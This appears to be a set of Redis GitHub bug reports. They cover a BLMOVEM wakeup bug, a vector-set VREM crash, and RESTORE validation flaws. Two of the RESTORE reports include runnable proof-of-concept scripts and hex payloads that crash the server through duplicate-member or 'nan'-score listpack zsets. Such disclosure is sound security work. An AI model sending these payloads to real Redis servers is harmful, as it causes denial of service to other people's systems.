title: [BUG] `BLMOVEM ... EXACTLY` is not woken when `SORT ... STORE` grows the list it is waiting on
author: dhruv2x
body:
### The Bug

`BLMOVEM ... EXACTLY <n>` blocks until the source list contains at least n elements.

When a client is blocked on an existing list, commands that grow the list such as `LPUSH`, `RPUSH`, `LINSERT`, and `LMOVE` correctly wake the client once enough elements are available.

`SORT ... STORE` is an exception. If the destination list already exists, storing into it replaces the list, but a client blocked with `BLMOVEM ... EXACTLY` is not reprocessed even when the new list satisfies the requested element count. The client remains blocked until its timeout (or indefinitely with a timeout of 0) 

A subsequent unrelated write that does signal (e.g. a plain `LPUSH`) will belatedly wake the client, but by then the list contents have changed, so the client can even move the wrong elements.

### Steps to reproduce

To reproduce

Client A
```
RPUSH dst a
BLMOVEM dst out LEFT RIGHT 0 EXACTLY 3 BULK
```

Client A blocks because dst contains only one element.

Client B
```
RPUSH src 3 1 2
SORT src STORE dst
INFO clients
```

SORT ... STORE replaces dst with:
```
[1 2 3]
```
but blocked_clients is still 1

If Client B now runs:
```
LPUSH dst x
```
Client A finally wakes and moves:
```
x 1 2
```
instead of the expected:
```
1 2 3
```

### Expected behavior

Client A unblocked and served as soon as SORT src STORE dst makes dst hold 3 elements, returning 1 2 3 exactly as if the list had grown via `LPUSH/LINSERT/LMOVE`.

### Actual behavior

Client A remains blocked after `SORT ... STORE` (blocked_clients stays 1). Only a later signalling command wakes it, by which time it may move different elements.

### Additional context

This appears to happen only when `SORT ... STORE` overwrites an existing destination key.

Tracing through the code suggests that the overwrite path in `setKeyByLink()` updates the value via `dbSetValue()` without notifying clients waiting for an existing list to grow, whereas the key-creation path already performs the appropriate signalling.(`dbAddByLink()` -> `dbAddInternal()`, which calls `signalKeyAsReady()`)

title: [BUG] Vector set: deterministic SIGSEGV in select_neighbors / hnsw_reconnect_nodes on VREM (8.4.0, aarch64), propagates to replicas
author: jjtjasonthomas
body:
**Describe the bug**

On Redis 8.4.0 we are seeing a deterministic crash (SIGSEGV, NULL pointer dereference) inside the vector set deletion path. It occurs during VREM while the HNSW graph is being repaired after node removal. The same crash reproduces across multiple independent vector-set keys and on multiple nodes, and — critically — it propagates through replication: a VREM that crashes a master is re-executed on the replica and crashes it too, so failover does not recover the shard.
This is a GA data type, single-threaded main-thread crash, not a memory-pressure or hardware issue (fast memory test passes; nodes have ample free RAM).


Version / environment

redis_version: 8.4.0
redis_mode: cluster
os: Linux 6.8.0 aarch64 (ARM64)
arch_bits: 64
mem_allocator: jemalloc-5.3.0
Module: vectorset ver=1 api=1
Vector sets: 2048 dimensions, default int8 (Q8) quantization
io-threads: 1

Crash signature

Signal 11, si_code: 1, faulting address (nil), fault_address: 0x0. Consistent across every occurrence:
select_neighbors+0x24c
hnsw_reconnect_nodes+0x6f4
VREM_RedisCommand+0x204
RedisModuleCommandDispatcher+0xbc
call+0x174
processCommand+0xb60
processInputBuffer+0x64c
readQueryFromClient+0x1e0
Registers at crash are identical each time — several zeroed pointers going into select_neighbors:
X21:0x0  X22:0x18  X23:0x0  X24:0x1  X25:0x0
pc: select_neighbors+0x24c   fault_address: 0x0
The offending command in every case is a 3-arg VREM <key> <element>. The dumped object is the expected vector set (Object type: 5 (module), encoding: 0).

**To reproduce**

Deterministic per element: re-issuing the same VREM <key> <element> crashes whatever node currently owns that slot.
Not tied to a single key: observed on three distinct vector-set keys removing three distinct elements, so this appears to be a general condition in the delete/relink logic rather than one corrupted set.
Replication cascade: in one shard, a VREM crashed the master; the promoted replica then crashed ~1.6s later on the same VREM (re-sent by the reconnecting client). Both master and replica in the shard were taken down by one deletion. We have observed the same crash arriving via the replication link (client flags=M, user=(superuser)) on a replica applying a propagated VREM.


Is this a known issue in the HNSW node-reconnect path, and is a fix available or in progress for 8.4.x / 8.6?

title: [BUG] `RESTORE` of `RDB_TYPE_ZSET_LISTPACK` with a duplicate member crashes Redis on a later `ZADD` via `dictAdd` assertion
author: sdjasj
body:
## Describe the bug

`RESTORE` accepts a client-supplied DUMP/RDB payload and loads it via `rdbLoadObject()`. For `RDB_TYPE_ZSET_LISTPACK` (type byte `0x11`), the loader validates the embedded listpack with `lpValidateIntegrityAndDups(encoded, encoded_len, deep_integrity_validation, 2)`. The duplicate-member check inside that function runs **only in deep mode** (`deep == 1`, i.e. `sanitize-dump-payload yes`): shallow mode (`deep == 0`, the default `sanitize-dump-payload no`) calls `lpValidateIntegrity(lp, size, 0, NULL, NULL)` with a NULL per-entry callback, so it validates structure only and never tracks member uniqueness. (`tuple_len=2` means "first element of each (member,score) tuple must be unique" — `src/rdb.c:2372-2373`.)

A structurally valid listpack that encodes the **same member twice** — `("a",1)` and `("a",2)` — therefore passes RESTORE under the default config and is installed as a live `OBJ_ZSET` / `OBJ_ENCODING_LISTPACK`. This violates the runtime zset invariant that dictionary-side member keys are unique. Ordinary reads still work and visibly expose the duplicate: `ZRANGE badz 0 -1 WITHSCORES` returns `a 1 a 2`, and `ZCARD` reports `2`.

A later `ZADD` whose new member exceeds `zset-max-listpack-value` (default `64`) forces the listpack zset to convert to skiplist/dict form. The converter `zsetConvertAndExpand()` walks the malformed listpack, inserts every tuple into the skiplist (which does not dedup on member name — that is the dict's job), and then asserts that the dictionary insertion succeeded:

```c
/* src/t_zset.c:1474-1485 — conversion loop */
while (eptr != NULL) {
    score = zzlGetScore(sptr);                       /* src/t_zset.c:1475 */
    ...
    node = zslInsert(zs->zsl,score,ele);             /* src/t_zset.c:1482 — skiplist allows dup ele */
    serverAssert(dictAdd(zs->dict, node, NULL) == DICT_OK);  /* src/t_zset.c:1483 — ABORTS on 2nd "a" */
    sdsfree(ele);
    zzlNext(zl,&eptr,&sptr);
}
```

The second `dictAdd` for member `"a"` returns `DICT_ERR` (key already exists), the assertion fails, and Redis aborts:

```text
=== ASSERTION FAILED ===
==> t_zset.c:1483 'dictAdd(zs->dict, node, NULL) == DICT_OK' is not true
```

This is an authenticated, remotely triggerable denial of service for any client with `RESTORE` permission (or any path loading an untrusted RDB on a server with the default `sanitize-dump-payload no`). The malformed object becomes normal runtime state — usable for reads — and can later kill the process through a regular `ZADD`.

The checksum gate is not a barrier: `verifyDumpPayload()` (`src/cluster.c:131`) accepts an all-zero 8-byte checksum as "No checksum" (`src/cluster.c:152-153`), so the hand-built payload needs no CRC64.

### Affected runtime code

- `src/cluster.c:183` — `restoreCommand()` accepts client-supplied DUMP/RDB bytes.
- `src/cluster.c:241` — `verifyDumpPayload()`; all-zero checksum accepted (`src/cluster.c:152-153`).
- `src/cluster.c:267` — object loaded through `rdbLoadObject()`.
- `src/rdb.c:3188` — `case RDB_TYPE_ZSET_LISTPACK:`.
- `src/rdb.c:3190` — `if (!lpValidateIntegrityAndDups(encoded, encoded_len, deep_integrity_validation, 2))` — `deep_integrity_validation` is `server.sanitize_dump_payload == SANITIZE_DUMP_YES` (`src/rdb.c:2415`), i.e. **off by default** (`src/config.c:3255`).
- `src/rdb.c:2374-2376` — `lpValidateIntegrityAndDups`: shallow path (`!deep`) returns `lpValidateIntegrity(lp, size, 0, NULL, NULL)` with a **NULL callback** — structure only, no duplicate check.
- `src/rdb.c:2378-2393` — deep path uses `_lpEntryValidation`, which builds a `fields` dict to reject duplicate tuple first-elements (members); comment at `src/rdb.c:2372-2373`: "first element in the tuple must be unique".
- `src/rdb.c:3197-3198` — `o->type = OBJ_ZSET; o->encoding = OBJ_ENCODING_LISTPACK;` — installed as a live zset without member-uniqueness having been checked (in default mode).
- `src/rdb.c:3199-3205` — load-time conversion to skiplist only if `zsetLength > zset_max_listpack_entries` (default `128`, `src/config.c:3353`); a 2-element zset stays listpack, deferring the crash.
- `src/t_zset.c:1444` — `zsetConvertAndExpand()`; `src/t_zset.c:1659` — called from `zsetAdd` when an input element exceeds `zset-max-listpack-value` (default `64`, `src/config.c:3357`), forcing conversion before inserting the new member.
- `src/t_zset.c:1475` — conversion reads each score via `zzlGetScore(sptr)`.
- `src/t_zset.c:1482` — `node = zslInsert(zs->zsl, score, ele)` — the skiplist permits the duplicate (it does not dedup on `ele`).
- `src/t_zset.c:1483` — `serverAssert(dictAdd(zs->dict, node, NULL) == DICT_OK);` — aborts on the second `("a",*)` tuple.

## To reproduce

The PoC below is self-contained and copy/paste-runnable from the repository root. It builds a 29-byte `RDB_TYPE_ZSET_LISTPACK` DUMP payload whose 17-byte listpack holds two zset tuples for member `a` (`("a",1)` and `("a",2)`), then runs **two** cases on fresh servers: `sanitize-dump-payload yes` (control — deep validation must reject the duplicate member) and `sanitize-dump-payload no` (the default — RESTORE accepts it, `ZRANGE` exposes the duplicate, `ZADD` crashes conversion).

> Requirements: a build of the vulnerable Redis at `./src/redis-server` / `./src/redis-cli` (or on `PATH`), plus `python3` (used only to assemble the binary payload bytes — no local project files are referenced). Verified on commit `d28dd44c4`, 64-bit Linux, GCC 9.4, `RDB_VERSION=14`.

```bash
#!/usr/bin/env bash
# RESTORE RDB_TYPE_ZSET_LISTPACK duplicate-member -> ZADD conversion assert abort — self-contained, copy/paste runnable.
set -u
PORT=18085
WORK="$(mktemp -d)"; ERR="$WORK/server.err"; PAYLOAD="$WORK/dump.bin"
SERVER="${REDIS_SERVER:-$(command -v redis-server || echo "${PWD}/src/redis-server")}"
CLI="${REDIS_CLI:-$(command -v redis-cli || echo "${PWD}/src/redis-cli")}"
rcli() { timeout 8 "$CLI" "$@"; }   # GNU timeout backstop so redis-cli can never hang/orphan the script

# Precisely free PORT (ss-based, NOT pkill -f which self-matches this script's bash wrapper).
PORT_PID=$(ss -ltnp 2>/dev/null | grep ":$PORT " | grep -oP 'pid=\K[0-9]+' | head -1)
[ -n "${PORT_PID:-}" ] && kill -9 "$PORT_PID" 2>/dev/null; sleep 0.2
cleanup() { [ -n "${SRV:-}" ] && kill -9 "$SRV" 2>/dev/null; rm -rf "$WORK"; }
trap cleanup EXIT INT TERM

# DUMP payload: RDB_TYPE_ZSET_LISTPACK(0x11), 17-byte listpack with TWO tuples for member "a"
# (("a",1) and ("a",2)). Footer = RDB len(17) | listpack | rdbver 14 LE | 8 zero bytes
# ("No checksum" -> accepted by verifyDumpPayload at src/cluster.c:152-153).
# Hex: 11 11 11000000 0400 8161 02 0101 8161 02 0201 ff 0e00 0000000000000000
python3 - "$PAYLOAD" <<'PY'
import sys
lp = (bytes.fromhex("11000000")        # listpack total bytes = 17
      + bytes.fromhex("0400")          # listpack num entries = 4 (2 zset elements = member+score x2)
      + b"\x81" + b"a" + b"\x02"       # member "a" (enc 0x81 len1, 'a', backlen 02)
      + b"\x01\x01"                    # score integer 1 (value 0x01, backlen 0x01)
      + b"\x81" + b"a" + b"\x02"       # member "a" again (DUPLICATE)
      + b"\x02\x01"                    # score integer 2 (value 0x02, backlen 0x01)
      + b"\xff")                       # listpack EOF
assert len(lp) == 17, len(lp)
payload = b"\x11" + bytes([len(lp)]) + lp + b"\x0e\x00" + bytes(8)  # type | RDB-len(17) | listpack | ver14 | zero crc
open(sys.argv[1], "wb").write(payload)
print(f"  payload: {len(payload)} bytes; hex={payload.hex()}")
PY

start_server() {  # $1 = sanitize mode
  "$SERVER" --port "$PORT" --save "" --appendonly no --dir "$WORK" \
            --sanitize-dump-payload "$1" --logfile /dev/stderr >"$ERR" 2>&1 &
  SRV=$!
  for i in $(seq 1 30); do timeout 2 "$CLI" -p "$PORT" PING >/dev/null 2>&1 && return 0; sleep 0.1; done
  echo "  server did not start (mode=$1)"; tail -5 "$ERR"; return 1
}

run_case() {  # $1 = label  $2 = sanitize mode
  echo "=== case: sanitize-dump-payload=$2 ($1) ==="
  start_server "$2" || return 1
  "$CLI" -p "$PORT" DEL badzset >/dev/null 2>&1
  echo -n "  RESTORE reply:     "; rcli -x -p "$PORT" RESTORE badzset 0 < "$PAYLOAD" 2>&1 | head -1
  # If RESTORE was rejected (deep mode caught the duplicate member), there is nothing more to trigger.
  if ! kill -0 "$SRV" 2>/dev/null; then
    echo "  (server died at RESTORE)"; grep -iE 'assert|Bad data|corrupt' "$ERR" | head -3; kill -9 "$SRV" 2>/dev/null; sleep 0.3; return
  fi
  # RESTORE returned an error reply but server is alive — check whether the key actually exists.
  if [ "$(rcli -p "$PORT" EXISTS badzset 2>/dev/null)" != "1" ]; then
    echo "  (RESTORE rejected the payload — duplicate member caught by deep validation; key not installed)"
    kill -9 "$SRV" 2>/dev/null; sleep 0.3; return
  fi
  echo -n "  ZCARD:             "; rcli -p "$PORT" ZCARD badzset 2>&1 | head -1
  echo -n "  ZRANGE WITHSCORES: "; rcli -p "$PORT" ZRANGE badzset 0 -1 WITHSCORES 2>&1 | tr '\n' ' '; echo
  bigval="$(python3 -c 'print("C"*65)')"   # > zset-max-listpack-value (default 64) -> force listpack->skiplist conversion
  echo -n "  ZADD reply:        "; rcli -p "$PORT" ZADD badzset 3 "$bigval" 2>&1 | head -1
  dead=0
  for i in $(seq 1 30); do kill -0 "$SRV" 2>/dev/null || { dead=1; break; }; sleep 0.1; done
  if [ "$dead" = 1 ]; then echo "  VERDICT: CRASHED (assert abort)"; else echo "  VERDICT: ALIVE"; fi
  grep -iE "ASSERTION FAILED|t_zset.c:148[0-9]|dictAdd|Guru Meditation" "$ERR" 2>/dev/null | head -4
  kill -9 "$SRV" 2>/dev/null; sleep 0.3
}

run_case "deep validation (control: must reject)" yes
echo
run_case "default (vulnerable: crashes)" no
```

Observed output on the vulnerable build (commit `d28dd44c4`, `RDB_VERSION=14`) — the control rejects, the default crashes:

```text
  payload: 29 bytes; hex=111111000000040081610201018161020201ff0e000000000000000000
=== case: sanitize-dump-payload=yes (deep validation (control: must reject)) ===
  RESTORE reply:     ERR Bad data format
  (RESTORE rejected the payload — duplicate member caught by deep validation; key not installed)

=== case: sanitize-dump-payload=no (default (vulnerable: crashes)) ===
  RESTORE reply:     OK
  ZCARD:             2
  ZRANGE WITHSCORES: a 1 a 2
  ZADD reply:        Error: Server closed the connection
  VERDICT: CRASHED (assert abort)
  === ASSERTION FAILED ===
  ==> t_zset.c:1483 'dictAdd(zs->dict, node, NULL) == DICT_OK' is not true
```

The process exits with status **134** (`abort()` → `SIGABRT`, signal 6). The stack visible in the crash log is `zaddGenericCommand` → `zsetAdd` → `zsetConvertAndExpand` → `serverAssert(dictAdd(zs->dict, node, NULL) == DICT_OK)`.

Payload layout (the 29 bytes above):

```text
11                       RDB_TYPE_ZSET_LISTPACK (type byte 0x11 = 17)
11                       RDB length encoding: 17-byte listpack blob follows
11 00 00 00              listpack total bytes = 17
04 00                    listpack num entries = 4  (2 zset elements = member+score x2)
81 61 02                 member "a"      (enc 0x81 len1, 'a', backlen 02)
01 01                    score integer 1 (value 0x01, backlen 0x01)
81 61 02                 member "a"      (DUPLICATE — same member, score 2)
02 01                    score integer 2 (value 0x02, backlen 0x01)
ff                       listpack EOF
0e 00                    RDB version 14, little-endian (<= RDB_VERSION=14)
00 00 00 00 00 00 00 00  all-zero checksum -> "No checksum", accepted by RESTORE
```

Equivalent bare steps against a default-config `redis-server` (the 29-byte payload is the last `RESTORE` argument via `redis-cli -x`):

```text
redis-cli -x RESTORE badzset 0 < dump.bin          # -> OK (duplicate member accepted under default sanitize=no)
redis-cli ZCARD badzset                              # -> 2  (semantically wrong; 1 unique member)
redis-cli ZRANGE badzset 0 -1 WITHSCORES             # -> a 1 a 2  (duplicate member exposed)
redis-cli ZADD badzset 3 <65-byte member>            # -> server aborts: t_zset.c:1483 'dictAdd(zs->dict, node, NULL) == DICT_OK' is not true
```

## Expected behavior

`RESTORE`/RDB load of an `RDB_TYPE_ZSET_LISTPACK` payload whose member tuples are not unique must be rejected as a corrupt payload (`ERR Bad data format`), **independently of `sanitize-dump-payload`**. Zset members are unique by definition; a listpack zset with duplicate members is not a valid runtime object and must never be installed. At minimum, such an object must never exist such that a later ordinary `ZADD` aborts the server via the conversion-time `dictAdd` assertion.

title: [BUG] `RESTORE` of `RDB_TYPE_ZSET_LISTPACK` with a `nan` score crashes Redis on a later `ZADD` via `zslInsert` assertion
author: sdjasj
body:
## Describe the bug

`RESTORE` accepts a client-supplied DUMP/RDB payload and loads it. When the payload is `RDB_TYPE_ZSET_LISTPACK` (type byte `0x11`), the loader validates the listpack structure and duplicate member names via `lpValidateIntegrityAndDups(..., tuple_len=2)` — but it never parses or validates the **score** entries semantically. Consequently a payload whose score entry is the string `nan` is accepted and installed as a live `OBJ_ZSET` with `OBJ_ENCODING_LISTPACK`, with `nan` as a real member score: `ZRANGE badz 0 -1 WITHSCORES` returns the member with score `nan`.

The score is only ever read later through `zzlGetScore()`, whose string path calls `fast_float_strtod()` — and `fast_float` has an explicit `parse_infnan()` path that accepts the literal `nan` (returning `NAN`). So the malformed score sails through every read.

A later zset write that forces the listpack to convert to a skiplist — e.g. `ZADD badz 2 <member longer than zset-max-listpack-value (default 64)>` — walks the listpack, reads each score via `zzlGetScore()`, and passes it to `zslInsert()`. `zslInsert()` opens with:

```c
serverAssert(!isnan(score));   /* src/t_zset.c:329 */
```

The `nan` score fails that assertion and Redis aborts (`SIGABRT`, signal 6):

```text
=== ASSERTION FAILED ===
==> t_zset.c:329 '!isnan(score)' is not true
```

**This crash is reachable even with `sanitize-dump-payload yes`** (verified below). That is the key distinction from the plain-`RDB_TYPE_HASH` duplicate-field conversion panic (which only triggers under the default `no`, because deep mode allocates the `dupSearchDict` that catches duplicates). Here deep mode's `lpValidateIntegrityAndDups` validates structure and duplicate *members* only — it has no score-semantics check — so the `nan` survives deep validation and still crashes on conversion. The bug is therefore a **missing zset-score semantic validation at RESTORE/RDB load time**, not a shallow-validation gap.

The checksum gate is not a barrier either: `verifyDumpPayload()` (`src/cluster.c:131`) accepts an all-zero 8-byte checksum as "No checksum" (`src/cluster.c:152-153`), so the hand-built payload needs no CRC64.

### Affected runtime code

- `src/cluster.c:183` — `restoreCommand()` accepts client-supplied DUMP/RDB bytes.
- `src/cluster.c:241` — `verifyDumpPayload()`; all-zero checksum accepted (`src/cluster.c:152-153`).
- `src/cluster.c:267` — object loaded through `rdbLoadObject()`.
- `src/rdb.c:3188` — `case RDB_TYPE_ZSET_LISTPACK:` (the compact-zset load branch, reached via the `RDB_TYPE_ZSET_LISTPACK` arm of the legacy-encoded block that began at `src/rdb.c:3006`).
- `src/rdb.c:3190` — `if (!lpValidateIntegrityAndDups(encoded, encoded_len, deep_integrity_validation, 2))` validates listpack **structure + duplicate members** (`tuple_len=2`) but **not** score numeric semantics. `deep_integrity_validation` here is `server.sanitize_dump_payload == SANITIZE_DUMP_YES` (`src/rdb.c:2415`); it only makes the structure/dups check stricter, it does not add a score check.
- `src/rdb.c:3197` — `o->type = OBJ_ZSET;`
- `src/rdb.c:3198` — `o->encoding = OBJ_ENCODING_LISTPACK;` (the object is installed as a live listpack zset).
- `src/rdb.c:3199-3205` — conversion to skiplist here happens only if `zsetLength(o) > zset_max_listpack_entries` (default `128`, `src/config.c:3353`); a one-element `nan` zset stays listpack.
- `src/t_zset.c:949` — `zzlStrtod()` calls `fast_float_strtod()` directly, no NaN rejection.
- `src/t_zset.c:953` — `zzlGetScore()`; `src/t_zset.c:963` — the string-score branch `score = zzlStrtod(vstr,vlen);` returns NaN for the `"nan"` entry.
- `src/t_zset.c:1444` / `src/t_zset.c:1475` — `zsetConvertAndExpand()` iterates the listpack and reads `score = zzlGetScore(sptr);`.
- `src/t_zset.c:1482` — `node = zslInsert(zs->zsl, score, ele);` passes the NaN into the skiplist.
- `src/t_zset.c:326` — `zslInsert()` definition; `src/t_zset.c:329` — `serverAssert(!isnan(score));` aborts.
- `src/fast_float_strtod.c:266-290` — `parse_infnan()` accepts `nan` (and `nan(n-char-seq)`); the test table at `src/fast_float_strtod.c:1031` confirms `{"nan", NAN}`.

The load branch that lets `nan` through (current `unstable`, commit `d28dd44c4`):

```c
/* src/rdb.c:3188 */
case RDB_TYPE_ZSET_LISTPACK:
    if (deep_integrity_validation) server.stat_dump_payload_sanitizations++;
    if (!lpValidateIntegrityAndDups(encoded, encoded_len, deep_integrity_validation, 2)) {
        rdbReportCorruptRDB("Zset listpack integrity check failed.");
        ... return NULL;
    }
    o->type = OBJ_ZSET;                 /* src/rdb.c:3197 */
    o->encoding = OBJ_ENCODING_LISTPACK;/* src/rdb.c:3198 — installed as a live zset, */
    if (zsetLength(o) == 0) { ... }     /*     score never parsed            */
    if (zsetLength(o) > server.zset_max_listpack_entries)
        zsetConvert(o, OBJ_ENCODING_SKIPLIST);   /* only on size — not on bad score */
    break;
```

The NaN-accepting score reader and the asserting converter:

```c
/* src/t_zset.c:949 — accepts "nan" */
static double zzlStrtod(unsigned char *vstr, unsigned int vlen) {
    return fast_float_strtod((char*)vstr, vlen, NULL);
}
/* src/t_zset.c:953 */
double zzlGetScore(unsigned char *sptr) {
    ...
    if (vstr) {
        score = zzlStrtod(vstr,vlen);          /* src/t_zset.c:963 — NaN for "nan" */
    } else {
        score = vlong;
    }
    ...
}
/* src/t_zset.c:326 */
zskiplistNode *zslInsert(zskiplist *zsl, double score, sds ele) {
    int level;
    serverAssert(!isnan(score));               /* src/t_zset.c:329 — aborts */
    ...
}
```

## To reproduce

The PoC below is self-contained and copy/paste-runnable from the repository root. It builds a 27-byte `RDB_TYPE_ZSET_LISTPACK` DUMP payload (one element: member `a`, score string `nan`, 15-byte listpack, RDB version 14, zero checksum), then runs **two** cases on fresh servers: `sanitize-dump-payload no` (the default) and `sanitize-dump-payload yes` (deep validation). In each case it `RESTORE`s the payload, shows `ZRANGE ... WITHSCORES` exposes `nan`, then triggers the assertion with `ZADD badz 2 <65-byte member>` and reports whether the process aborted.

> Requirements: a build of the vulnerable Redis at `./src/redis-server` / `./src/redis-cli` (or on `PATH`), plus `python3` (used only to assemble the binary payload bytes — no local project files are referenced). Verified on commit `d28dd44c4`, 64-bit Linux, GCC 9.4, `RDB_VERSION=14`.

```bash
#!/usr/bin/env bash
# RESTORE RDB_TYPE_ZSET_LISTPACK nan-score -> ZADD conversion assert abort — self-contained, copy/paste runnable.
set -u
PORT=18083
WORK="$(mktemp -d)"; ERR="$WORK/server.err"; PAYLOAD="$WORK/dump.bin"
SERVER="${REDIS_SERVER:-$(command -v redis-server || echo "${PWD}/src/redis-server")}"
CLI="${REDIS_CLI:-$(command -v redis-cli || echo "${PWD}/src/redis-cli")}"
rcli() { timeout 8 "$CLI" "$@"; }   # GNU timeout backstop so redis-cli can never hang/orphan the script

# Precisely free PORT (ss-based, NOT pkill -f which self-matches this script's bash wrapper).
PORT_PID=$(ss -ltnp 2>/dev/null | grep ":$PORT " | grep -oP 'pid=\K[0-9]+' | head -1)
[ -n "${PORT_PID:-}" ] && kill -9 "$PORT_PID" 2>/dev/null; sleep 0.2
cleanup() { [ -n "${SRV:-}" ] && kill -9 "$SRV" 2>/dev/null; rm -rf "$WORK"; }
trap cleanup EXIT INT TERM

# DUMP payload: RDB_TYPE_ZSET_LISTPACK(0x11), then a 15-byte listpack holding ONE zset element
# (member "a", score string "nan"), footer = rdbver 14 LE + 8 zero bytes ("No checksum" ->
# accepted by verifyDumpPayload at src/cluster.c:152-153). Hex: 110f0f0000000200816102 836e616e04 ff 0e00 0000000000000000
python3 - "$PAYLOAD" <<'PY'
import sys
lp = (bytes.fromhex("0f000000")        # listpack total bytes = 15
      + bytes.fromhex("0200")          # listpack num entries = 2  (member + score = 1 zset element)
      + b"\x81" + b"a" + b"\x02"       # entry "a"   (enc 0x81 len1, 'a', backlen 02)
      + b"\x83" + b"nan" + b"\x04"     # entry "nan" (enc 0x83 len3, 'n''a''n', backlen 04)  <- score
      + b"\xff")                       # listpack EOF
assert len(lp) == 15, len(lp)
payload = b"\x11" + bytes([len(lp)]) + lp + b"\x0e\x00" + bytes(8)  # type | RDB-len(15) | listpack | ver14 | zero crc
open(sys.argv[1], "wb").write(payload)
print(f"  payload: {len(payload)} bytes; hex={payload.hex()}")
PY

start_server() {  # $1 = sanitize mode
  "$SERVER" --port "$PORT" --save "" --appendonly no --dir "$WORK" \
            --sanitize-dump-payload "$1" --logfile /dev/stderr >"$ERR" 2>&1 &
  SRV=$!
  for i in $(seq 1 30); do timeout 2 "$CLI" -p "$PORT" PING >/dev/null 2>&1 && return 0; sleep 0.1; done
  echo "  server did not start (mode=$1)"; tail -5 "$ERR"; return 1
}

run_case() {  # $1 = label  $2 = sanitize mode
  echo "=== case: sanitize-dump-payload=$2 ($1) ==="
  start_server "$2" || return 1
  "$CLI" -p "$PORT" DEL badz >/dev/null 2>&1
  echo -n "  RESTORE reply:   "; rcli -x -p "$PORT" RESTORE badz 0 < "$PAYLOAD" 2>&1 | head -1
  kill -0 "$SRV" 2>/dev/null || { echo "  (server died at RESTORE)"; grep -iE 'assert|Guru|corrupt' "$ERR" | head -3; return; }
  echo -n "  ZRANGE WITHSCORES: "; rcli -p "$PORT" ZRANGE badz 0 -1 WITHSCORES 2>&1 | tr '\n' ' '; echo
  bigval="$(python3 -c 'print("B"*65)')"   # > zset-max-listpack-value (default 64) -> force listpack->skiplist
  echo -n "  ZADD reply:       "; rcli -p "$PORT" ZADD badz 2 "$bigval" 2>&1 | head -1
  dead=0
  for i in $(seq 1 30); do kill -0 "$SRV" 2>/dev/null || { dead=1; break; }; sleep 0.1; done
  if [ "$dead" = 1 ]; then echo "  VERDICT: CRASHED (assert abort)"; else echo "  VERDICT: ALIVE"; fi
  grep -iE "ASSERTION FAILED|t_zset.c:329|!isnan\(score\)|Guru Meditation" "$ERR" 2>/dev/null | head -4
  kill -9 "$SRV" 2>/dev/null; sleep 0.3
}

run_case "default (vulnerable)" no
echo
run_case "deep validation (STILL crashes)" yes
```

Observed output on the vulnerable build (commit `d28dd44c4`, `RDB_VERSION=14`) — **both** modes crash identically:

```text
  payload: 27 bytes; hex=110f0f0000000200816102836e616e04ff0e000000000000000000
=== case: sanitize-dump-payload=no (default (vulnerable)) ===
  RESTORE reply:     OK
  ZRANGE WITHSCORES: a nan
  ZADD reply:        Error: Server closed the connection
  VERDICT: CRASHED (assert abort)
  === ASSERTION FAILED ===
  ==> t_zset.c:329 '!isnan(score)' is not true

=== case: sanitize-dump-payload=yes (deep validation (STILL crashes)) ===
  RESTORE reply:     OK
  ZRANGE WITHSCORES: a nan
  ZADD reply:        Error: Server closed the connection
  VERDICT: CRASHED (assert abort)
  === ASSERTION FAILED ===
  ==> t_zset.c:329 '!isnan(score)' is not true
```

The process exits with status **134** (`abort()` → `SIGABRT`, signal 6). The stack visible in the crash log is `zaddGenericCommand` → `zsetAdd` → `zsetConvertAndExpand` → `zslInsert` → `serverAssert(!isnan(score))`.

Payload layout (the 27 bytes above):

```text
11                       RDB_TYPE_ZSET_LISTPACK (type byte 0x11 = 17)
0f                       RDB length encoding: 15-byte listpack blob follows
0f 00 00 00              listpack total bytes = 15
02 00                    listpack num entries = 2 (member + score = 1 zset element)
81 61 02                 member entry "a"      (enc 0x81 len1, 'a', backlen 02)
83 6e 61 6e 04           score  entry "nan"    (enc 0x83 len3, 'n''a''n', backlen 04)  <-- NaN score
ff                       listpack EOF
0e 00                    RDB version 14, little-endian (<= RDB_VERSION=14)
00 00 00 00 00 00 00 00  all-zero checksum -> "No checksum", accepted by RESTORE
```

Equivalent bare steps against a default-config `redis-server` (the 27-byte payload is the last `RESTORE` argument via `redis-cli -x`):

```text
redis-cli -x RESTORE badz 0 < dump.bin             # -> OK (the "nan" score is accepted at load time)
redis-cli ZRANGE badz 0 -1 WITHSCORES               # -> a / nan   (NaN exposed as a live score)
redis-cli ZADD badz 2 <65-byte member>              # -> server aborts: t_zset.c:329 '!isnan(score)' is not true
```

## Expected behavior

`RESTORE`/RDB load of an `RDB_TYPE_ZSET_LISTPACK` payload whose score entry is not a finite non-NaN double must be rejected as a corrupt payload (`ERR Bad data format`), **independently of `sanitize-dump-payload`**. Sorted-set scores have a well-defined domain (finite doubles); a listpack zset with a `nan` score is not a valid runtime object and must never be installed. At minimum, a load-time NaN/inf score must never exist such that a later ordinary `ZADD` aborts the server.

title: [BUG] `RESTORE` of `RDB_TYPE_HASH` with duplicate fields crashes Redis on a later `HSET` via listpack→dict conversion panic (authenticated remote DoS)
author: sdjasj
body:
## Describe the bug

`RESTORE` accepts client-supplied DUMP/RDB bytes and loads them through `rdbLoadObject()`. When the payload is an ordinary `RDB_TYPE_HASH` and `sanitize-dump-payload` is left at its default `no`, the load path does **not** build the duplicate-field search dictionary, so a payload that encodes the *same field twice* is accepted and installed as a live `OBJ_HASH` / `OBJ_ENCODING_LISTPACK` object — `HLEN` reports `2` and `HGETALL` returns both duplicate entries. The duplicate field survives because, outside deep-validation mode, fields are simply appended into the runtime listpack with no uniqueness check.

A subsequent ordinary write that forces the hash to convert from listpack to a real hash table — e.g. `HSET badhash x <value larger than hash-max-listpack-value (default 64)>` — calls `hashTypeConvertListpack()`. That conversion inserts every listpack field into a dictionary and, when `dictAdd()` fails on the duplicate field, treats it as corruption and calls `serverPanic()`, aborting the whole `redis-server` process:

```text
Guru Meditation: Listpack corruption detected #t_hash.c:1678
```

This is an authenticated, remotely triggerable denial of service for any client with `RESTORE` permission (or any path that loads an untrusted RDB on a server with the default `sanitize-dump-payload no`). The malformed serialized object becomes normal runtime state and can later kill the process through a regular `HSET`. It also breaks hash semantics before the crash: `HLEN` double-counts the field and `HGETALL` returns the same field twice.

The checksum gate does **not** protect against this payload: `verifyDumpPayload()` (`src/cluster.c:131`) explicitly accepts an all-zero 8-byte checksum as "No checksum" (`src/cluster.c:152-153`), so a hand-built payload needs no CRC64 computation.

### Affected runtime code

- `src/cluster.c:183` — `restoreCommand()` accepts client-supplied DUMP/RDB bytes.
- `src/cluster.c:241` — `verifyDumpPayload()` is called; it accepts an all-zero checksum (`src/cluster.c:152-153`).
- `src/cluster.c:267` — the object is loaded through `rdbLoadObject()`.
